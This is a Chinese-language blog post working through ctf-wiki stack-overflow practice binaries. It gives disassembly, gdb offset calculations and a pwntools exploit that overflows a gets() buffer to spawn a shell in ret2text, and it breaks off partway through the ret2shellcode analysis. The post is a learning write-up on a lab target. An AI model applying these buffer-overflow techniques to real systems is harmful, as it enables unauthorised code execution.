<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ret2text 来源 ctf-wiki basic-rop 。 ret2text 是最简单的一题了。gdb 确定目标地址后直接溢出即可。 基本信息 1 2 3 4 5 6 7 8 9 # file bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped"><title>几个简单的 pwn 练习</title>
<link rel=canonical href=https://nnnewb.github.io/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/>
<link rel=stylesheet href=/scss/style.min.709d4f89582c5a09dc94158a722a16093cdffe24d9a8c77dd3f422c786203c41.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale('zh-cn'),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="几个简单的 pwn 练习">
<meta property="og:description" content="ret2text 来源 ctf-wiki basic-rop 。 ret2text 是最简单的一题了。gdb 确定目标地址后直接溢出即可。 基本信息 1 2 3 4 5 6 7 8 9 # file bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped">
<meta property="og:url" content="https://nnnewb.github.io/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/">
<meta property="og:site_name" content="weakptr's 笔记">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="pwn"><meta property="article:published_time" content="2022-12-31T14:07:29+08:00"><meta property="article:modified_time" content="2022-12-31T14:07:29+08:00">
<meta name=twitter:title content="几个简单的 pwn 练习">
<meta name=twitter:description content="ret2text 来源 ctf-wiki basic-rop 。 ret2text 是最简单的一题了。gdb 确定目标地址后直接溢出即可。 基本信息 1 2 3 4 5 6 7 8 9 # file bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.setItem(a,"light")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/>
<img src=/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>🍑</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/>weakptr's 笔记</a></h1>
<h2 class=site-description>弃船！</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>首页</span>
</a>
</li>
<li>
<a href=/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于我</span>
</a>
</li>
<li>
<a href=/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span>
</a>
</li>
<li>
<a href=/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>分类</span>
</a>
</li>
<li>
<a href=/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>标签</span>
</a>
</li>
<li>
<a href=/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>友链</span>
</a>
</li>
<li>
<a href=/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span>
</a>
</li>
<div class=menu-bottom-section>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/>几个简单的 pwn 练习</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2022-12-31T14:07:29+08:00>2022年 12月 31日</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 8 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=ret2text>ret2text</h2>
<blockquote>
<p>来源 <a class=link href=https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/ target=_blank rel=noopener>ctf-wiki basic-rop</a> 。</p>
</blockquote>
<p><code>ret2text</code> 是最简单的一题了。gdb 确定目标地址后直接溢出即可。</p>
<h3 id=基本信息>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file
bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped

# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析>行为分析</h3>
<p>运行 <code>ret2text</code> 观察行为。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>There is something amazing here, do you know anything?
no
Maybe I will tell you next time !%
</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析>反编译分析</h3>
<p><code>objdump -Sd ret2text</code> 然后找到 <code>main</code> 函数。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>08048648 &lt;main&gt;:
 8048648:	55                   	push   %ebp
 8048649:	89 e5                	mov    %esp,%ebp
 804864b:	83 e4 f0             	and    $0xfffffff0,%esp
 804864e:	83 c4 80             	add    $0xffffff80,%esp
 8048651:	a1 60 a0 04 08       	mov    0x804a060,%eax
 8048656:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
 804865d:	00 
 804865e:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
 8048665:	00 
 8048666:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 804866d:	00 
 804866e:	89 04 24             	mov    %eax,(%esp)
 8048671:	e8 5a fe ff ff       	call   80484d0 &lt;setvbuf@plt&gt;
 8048676:	a1 40 a0 04 08       	mov    0x804a040,%eax
 804867b:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
 8048682:	00 
 8048683:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
 804868a:	00 
 804868b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 8048692:	00 
 8048693:	89 04 24             	mov    %eax,(%esp)
 8048696:	e8 35 fe ff ff       	call   80484d0 &lt;setvbuf@plt&gt;
 804869b:	c7 04 24 6c 87 04 08 	movl   $0x804876c,(%esp)
 80486a2:	e8 d9 fd ff ff       	call   8048480 &lt;puts@plt&gt;
 80486a7:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 80486ab:	89 04 24             	mov    %eax,(%esp)
 80486ae:	e8 ad fd ff ff       	call   8048460 &lt;gets@plt&gt;
 80486b3:	c7 04 24 a4 87 04 08 	movl   $0x80487a4,(%esp)
 80486ba:	e8 91 fd ff ff       	call   8048450 &lt;printf@plt&gt;
 80486bf:	b8 00 00 00 00       	mov    $0x0,%eax
 80486c4:	c9                   	leave  
 80486c5:	c3                   	ret    
 80486c6:	66 90                	xchg   %ax,%ax
 80486c8:	66 90                	xchg   %ax,%ax
 80486ca:	66 90                	xchg   %ax,%ax
 80486cc:	66 90                	xchg   %ax,%ax
 80486ce:	66 90                	xchg   %ax,%ax08048648 &lt;main&gt;:
 8048648:	55                   	push   %ebp
 8048649:	89 e5                	mov    %esp,%ebp
 804864b:	83 e4 f0             	and    $0xfffffff0,%esp
 804864e:	83 c4 80             	add    $0xffffff80,%esp
 8048651:	a1 60 a0 04 08       	mov    0x804a060,%eax
 8048656:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
 804865d:	00 
 804865e:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
 8048665:	00 
 8048666:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 804866d:	00 
 804866e:	89 04 24             	mov    %eax,(%esp)
 8048671:	e8 5a fe ff ff       	call   80484d0 &lt;setvbuf@plt&gt;
 8048676:	a1 40 a0 04 08       	mov    0x804a040,%eax
 804867b:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
 8048682:	00 
 8048683:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
 804868a:	00 
 804868b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 8048692:	00 
 8048693:	89 04 24             	mov    %eax,(%esp)
 8048696:	e8 35 fe ff ff       	call   80484d0 &lt;setvbuf@plt&gt;
 804869b:	c7 04 24 6c 87 04 08 	movl   $0x804876c,(%esp)
 80486a2:	e8 d9 fd ff ff       	call   8048480 &lt;puts@plt&gt;
 80486a7:	8d 44 24 1c          	lea    0x1c(%esp),%eax
 80486ab:	89 04 24             	mov    %eax,(%esp)
 80486ae:	e8 ad fd ff ff       	call   8048460 &lt;gets@plt&gt;
 80486b3:	c7 04 24 a4 87 04 08 	movl   $0x80487a4,(%esp)
 80486ba:	e8 91 fd ff ff       	call   8048450 &lt;printf@plt&gt;
 80486bf:	b8 00 00 00 00       	mov    $0x0,%eax
 80486c4:	c9                   	leave
 80486c5:	c3                   	ret
</code></pre></td></tr></table>
</div>
</div><p>注意到不安全函数 <code>gets</code> 调用，计算 <code>lea</code> 后参数应该是 <code>0x1c(%esp)</code>，也就是栈顶往下28个字节。观察函数序言部分，<code>add $0xffffff80,%esp</code> 分配了 128 个字节大小的栈空间，128-28=100 。初步猜测 <code>gets</code> 参数长度 100 字节。输入大于 100 即造成溢出。</p>
<p>然后我们寻找到想要返回的目标地址：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>080485fd &lt;secure&gt;:
    ... 略
</code></pre></td></tr></table>
</div>
</div><p>gdb 调试计算 <code>0x1c(%esp)</code> 到返回地址的距离。</p>
<p>返回地址在 <code>0xffffd24c</code>，<code>0x1c(%esp)</code> 是 <code>0xffffd1dc</code>，相减得 112 。</p>
<p>尝试写出 exploit。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s1>&#39;bin/ret2text&#39;</span><span class=p>,</span>
                 <span class=s1>&#39;&#39;&#39;
</span><span class=s1>                 b main
</span><span class=s1>                 continue
</span><span class=s1>                 &#39;&#39;&#39;</span><span class=p>)</span>
<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>112</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=mh>0x080485fd</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>调试发现段错误，继续阅读 <code>secure</code> 函数的代码。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>080485fd &lt;secure&gt;:
 80485fd:	55                   	push   %ebp
 80485fe:	89 e5                	mov    %esp,%ebp
 8048600:	83 ec 28             	sub    $0x28,%esp
 8048603:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 804860a:	e8 61 fe ff ff       	call   8048470 &lt;time@plt&gt;
 804860f:	89 04 24             	mov    %eax,(%esp)
 8048612:	e8 99 fe ff ff       	call   80484b0 &lt;srand@plt&gt;
 8048617:	e8 c4 fe ff ff       	call   80484e0 &lt;rand@plt&gt;
 804861c:	89 45 f4             	mov    %eax,-0xc(%ebp)
 804861f:	8d 45 f0             	lea    -0x10(%ebp),%eax
 8048622:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048626:	c7 04 24 60 87 04 08 	movl   $0x8048760,(%esp)
 804862d:	e8 be fe ff ff       	call   80484f0 &lt;__isoc99_scanf@plt&gt;
 8048632:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048635:	3b 45 f4             	cmp    -0xc(%ebp),%eax
 8048638:	75 0c                	jne    8048646 &lt;secure+0x49&gt;
 804863a:	c7 04 24 63 87 04 08 	movl   $0x8048763,(%esp)
 8048641:	e8 4a fe ff ff       	call   8048490 &lt;system@plt&gt;
 8048646:	c9                   	leave  
 8048647:	c3                   	ret    
</code></pre></td></tr></table>
</div>
</div><p>人肉反编译下得到伪代码。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>srand</span><span class=p>(</span><span class=n>time</span><span class=p>());</span>
<span class=n>var_0xc</span> <span class=o>=</span> <span class=n>rand</span><span class=p>();</span>
<span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>var_0x10</span><span class=p>);</span>
<span class=k>if</span> <span class=p>(</span><span class=n>var_0xc</span> <span class=o>!=</span> <span class=n>var_0x10</span><span class=p>)</span> <span class=k>return</span><span class=p>;</span>
<span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>soooooo，没必要硬怼随机数，直接跳到 <code>system("/bin/sh")</code> 就好。把 exploit 中跳转地址改成 <code>0x804863a</code> 完事。</p>
<h3 id=exploit>exploit</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./bin/ret2text&#39;</span><span class=p>)</span>

<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>112</span><span class=o>+</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=mh>0x804863a</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852.png width=768 height=189 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852_hu547b216eb7564cf5d0c43082362f8833_81863_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852_hu547b216eb7564cf5d0c43082362f8833_81863_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220823115054852 class=gallery-image data-flex-grow=406 data-flex-basis=975px></p>
<h2 id=ret2shellcode>ret2shellcode</h2>
<blockquote>
<p>来源依然是 ctf-wiki 我就不放链接了。</p>
</blockquote>
<h3 id=基本信息-1>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file 
bin/ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped
# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析-1>行为分析</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » bin/ret2shellcode
No system for you this time !!!
noooooooooooo
bye bye ~%
</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析-1>反编译分析</h3>
<p>这次换个工具。</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222.png width=1235 height=803 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222_hu949b7766ae1479d0a57fa90f15ea25cc_123358_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222_hu949b7766ae1479d0a57fa90f15ea25cc_123358_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220823172802222 class=gallery-image data-flex-grow=153 data-flex-basis=369px></p>
<p>知名的 Ghidra，直接看 C 代码。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
  <span class=kt>char</span> <span class=n>buf</span> <span class=p>[</span><span class=mi>100</span><span class=p>];</span>
  <span class=kt>char</span> <span class=n>local_74</span> <span class=p>[</span><span class=mi>112</span><span class=p>];</span>
  
  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;No system for you this time !!!&#34;</span><span class=p>);</span>
  <span class=n>gets</span><span class=p>(</span><span class=n>local_74</span><span class=p>);</span>
  <span class=n>strncpy</span><span class=p>(</span><span class=n>buf2</span><span class=p>,</span><span class=n>local_74</span><span class=p>,</span><span class=mi>100</span><span class=p>);</span>
  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;bye bye ~&#34;</span><span class=p>);</span>
  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
